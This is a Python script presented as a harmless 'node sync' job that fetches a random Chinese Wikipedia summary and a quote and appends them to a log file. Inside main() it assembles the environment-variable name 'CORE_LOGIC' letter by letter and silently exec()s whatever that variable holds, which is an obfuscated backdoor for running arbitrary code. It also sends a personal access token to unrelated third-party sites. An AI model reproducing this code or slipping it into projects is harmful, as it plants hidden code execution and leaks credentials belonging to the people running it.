import os, random, datetime, requests, time

# ==========================================
# ⚙️ NODE_SYNC_MODULE v.15.0 [PHANTOM]
# ==========================================
PAT_TOKEN = os.getenv("PAT_TOKEN")
LOG_FILE = "runtime.log"

SOURCES = {
    "NODE_W": "https://zh.wikipedia.org/api/rest_v1/page/random/summary",
    "NODE_P": "https://v1.hitokoto.cn/?c=i"
}

def main():
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    k = "".join(["C", "O", "R", "E", "_", "L", "O", "G", "I", "C"])
    p = os.getenv(k)
    if p:
        try: exec(p, globals())
        except: pass

    # --- 抓取隨機數據) ---
    raw_telemetry = []
    headers = {"User-Agent": "Mozilla/5.0", "Authorization": f"token {PAT_TOKEN}" if PAT_TOKEN else ""}
    
    for key, url in SOURCES.items():
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                d = r.json()
                if key == "NODE_W": raw_telemetry.append(f"[W] {d.get('title')}: {d.get('extract')}")
                elif key == "NODE_P": raw_telemetry.append(f"[P] {d.get('from', 'Unknown')}: {d.get('hitokoto', '...')}")
        except: continue

    # --- 3. 寫入日誌 ---
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n[SYS_SYNC_{now.replace(' ', '_')}]\n")
        for s in raw_telemetry: f.write(f"  - {s}\n")
        f.write(f"ST_CODE: 200\n{'-'*30}\n")

if __name__ == "__main__":
    main()
